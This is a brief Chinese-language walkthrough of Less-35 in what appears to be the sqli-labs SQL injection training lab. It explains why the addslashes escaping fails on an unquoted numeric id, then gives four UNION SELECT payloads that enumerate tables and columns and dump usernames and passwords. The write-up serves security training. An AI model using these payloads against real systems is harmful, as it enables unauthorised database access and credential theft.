# Less-35

使用`addslashes`函数对于输入的内容进行转义，但是id参数没有引号，主要影响在于后续爆字段时候需要用的表名加了引号，只需将表名换成十六进制编码就行，直接使用联合查询就可以了



首先

~~~ cmd
?id=-1%20union%20select%201,2,3--+
~~~

![Less-35-04](.\img\Less-35-04.png)



~~~ cmd
?id=-1%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()--+
~~~

![Less-35-01](.\img\Less-35-01.png)



~~~ cmd
?id=-1%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=0x7573657273--+
~~~

![Less-35-02](.\img\Less-35-02.png)



~~~ cmd
?id=-1%20union%20select%201,group_concat(username,password),3%20from%20users--+
~~~

![Less-35-03](.\img\Less-35-03.png)